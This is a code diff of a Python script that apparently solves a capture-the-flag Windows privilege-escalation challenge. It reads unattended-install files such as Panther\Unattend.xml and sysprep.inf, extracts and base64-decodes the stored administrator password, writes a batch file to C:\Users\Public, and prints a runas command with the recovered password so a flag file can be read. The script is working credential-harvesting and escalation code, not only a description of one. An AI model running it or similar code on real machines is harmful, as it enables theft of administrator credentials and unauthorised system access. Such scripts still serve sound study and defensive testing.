@@ -2,58 +2,63 @@ import time
 import os
 import re
 import base64
-import subprocess
 
-# Step 1: Common file locations
+# Fix padding if needed
+def fix_base64_padding(s):
+    return s + "=" * ((4 - len(s) % 4) % 4)
+
+# Step 1: Search for unattended installation files
 search_paths = [
-    r'C:\sysprep\sysprep.inf',
-    r'C:\Windows\Panther\Unattend.xml',
-    r'C:\Windows\Panther\Unattend\Unattend.xml',
-    r'C:\Windows\System32\Sysprep\Unattend.xml'
+    r"C:\Windows\Panther\Unattend.xml", # here is the encoded password
+    r"C:\Windows\System32\sysprep\sysprep.inf",
+    r"C:\Windows\System32\sysprep\Unattend.xml"
 ]
 
-def find_password():
-    pattern = r'<AdministratorPassword>.*?<Value>(.*?)</Value>'
-    for path in search_paths:
-        if os.path.exists(path):
-            with open(path, 'r', errors='ignore') as f:
-                content = f.read()
-                match = re.search(pattern, content, re.DOTALL)
-                if match:
-                    return match.group(1)
-    return None
+password = None
 
-def decode_password(pwd):
+print("[*] Searching for admin password...")
+
+for path in search_paths:
+    if os.path.exists(path):
+        with open(path, "r", errors="ignore") as f:
+            contents = f.read()
+            match = re.search(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", contents, re.DOTALL)
+            if match:
+                encoded_password = match.group(1).strip()
+                print(f"[+] Extracted (raw): {encoded_password}")
+
+                # Try to decode it
+                try:
+                    encoded_password = fix_base64_padding(encoded_password)
+                    decoded_password = base64.b64decode(encoded_password).decode("utf-8")
+                    password = decoded_password
+                except Exception as e:
+                    print(f"[!] Could not decode password, using raw value. Error: {e}")
+                    password = encoded_password
+                break
+
+if password:
+    # Step 2: Create getflag.bat with piped input
+    bat_content = '''@echo off
+REM pipe a blank line into flag.exe so it uses the default username
+"C:\\Users\\SuperAdministrator\\Desktop\\flag.exe" > "C:\\Users\\Public\\flag.txt" 2>&1
+'''
+
+    bat_path = r"C:\Users\Public\getflag.bat"
     try:
-        return base64.b64decode(pwd).decode('utf-8')
-    except Exception:
-        return pwd  # Return as-is if not base64
+        with open(bat_path, "w") as f:
+            f.write(bat_content)
+        print(f"[>] Batch file created: {bat_path}")
+    except Exception as e:
+        print(f"[!] Failed to write batch file: {e}")
 
-def runas_admin(password):
-    # Save command to temporary script
-    flag_script = r'C:\Users\Public\getflag.bat'
-    with open(flag_script, 'w') as f:
-        f.write(r'type "C:\Users\Administrator\Desktop\flag.txt" > C:\Users\Public\flag.txt')
-
-    # Use runas (will prompt for password)
-    runas_cmd = f'runas /user:Administrator "{flag_script}"'
-    print(f"[>] Use the password below to run this manually:")
-    print(f"    {runas_cmd}")
+    # Step 3: Print instructions
+    print("[>] In a new cmd use the command below to run it with admin privileges:")
+    print(f"    runas /user:SuperAdministrator \"{bat_path}\"")
     print(f"[>] Administrator Password: {password}")
-    print("\n[!] Then check C:\\Users\\Public\\flag.txt")
+    print("[!] A new all black cmd will be prompt. Provide your github user and press enter")
+    print("[!] Then read the output from: C:\\Users\\Public\\flag.txt")
+else:
+    print("[-] Administrator password not found.")
 
-def main():
-    print("[*] Searching for admin password...")
-    raw_pwd = find_password()
-    if not raw_pwd:
-        print("[!] Password not found.")
-        return
-
-    decoded = decode_password(raw_pwd)
-    print(f"[+] Extracted Password: {decoded}")
-
-    runas_admin(decoded)
-
-if __name__ == '__main__':
-    main()
-    time.sleep(10)
+time.sleep(10)
